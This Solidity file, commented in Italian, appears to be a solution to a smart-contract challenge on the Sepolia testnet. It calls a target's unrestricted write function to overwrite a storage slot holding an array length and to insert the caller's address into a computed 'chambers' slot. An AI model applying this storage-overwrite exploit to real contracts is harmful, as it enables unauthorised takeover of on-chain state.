// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Definisci l'interfaccia del contratto esterno
interface IExternalContract {
    function write(uint256 value, bytes32 data) external;
}

contract CallerContract {

    // Indirizzo del contratto esterno su Sepolia
    address public externalContractAddress = 0xdC4a859fC6c87875a5831B206fD66A4f7D911F6f;

    // Funzione per chiamare la funzione write del contratto esterno
    function callExternalWrite() public {
        // Crea un'istanza dell'interfaccia del contratto esterno
        IExternalContract temple = IExternalContract(externalContractAddress);

        //1

        // Prepara i parametri per la funzione write

        //uint256 value = 1;

        // Chiama la funzione write del contratto esterno

        // temple.write(value, encodedSender);

        //2
        //uint256 value = 1;
        //bytes32 encodedSender = bytes32(abi.encode(msg.sender));
        //uint x = uint(keccak256(abi.encode(20, 2)));
        //temple.write(uint(keccak256(abi.encode(22, x))),encodedSender);

       //3
       bytes32 encodedSender = bytes32(abi.encode(msg.sender));
       temple.write(3, bytes32(uint256(6))); // Updates length
       temple.write(
       uint(keccak256(abi.encode(3))) + 5, encodedSender); // Updates chambers[5]
        
    }
}
